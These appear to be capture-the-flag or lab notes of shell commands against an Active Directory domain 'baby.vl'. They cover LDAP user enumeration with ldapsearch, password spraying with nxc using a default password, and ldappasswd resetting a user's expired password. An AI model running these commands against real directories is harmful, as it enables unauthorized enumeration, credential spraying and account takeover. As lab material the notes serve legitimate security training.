```sh
ldapsearch -H ldap://$target -x -D "domain\\usuario" -w "password" -b "DC=dominio,DC=local" "(objectClass=user)"
```

```sh
ldapsearch -H ldap://$target -x -b "DC=baby,DC=vl" "(objectClass=user)"
ldapsearch -H ldap://$target -x -b "DC=baby,DC=vl" "*"
```

```bash
# Password Spraying
nxc ldap $target -u total_user.txt -p 'BabyStart123!'
# STATUS_PASSWORD_MUST_CHANGE
ldappasswd -H ldap://$target -x -D "CN=Caroline Robinson,OU=dev,DC=baby,DC=vl" -S

ldappasswd -H ldap://$target -x -D "CN=Caroline Robinson,OU=dev,DC=baby,DC=vl" -w "BabyStart123!" -s "NuevaContrasenia123!"
```
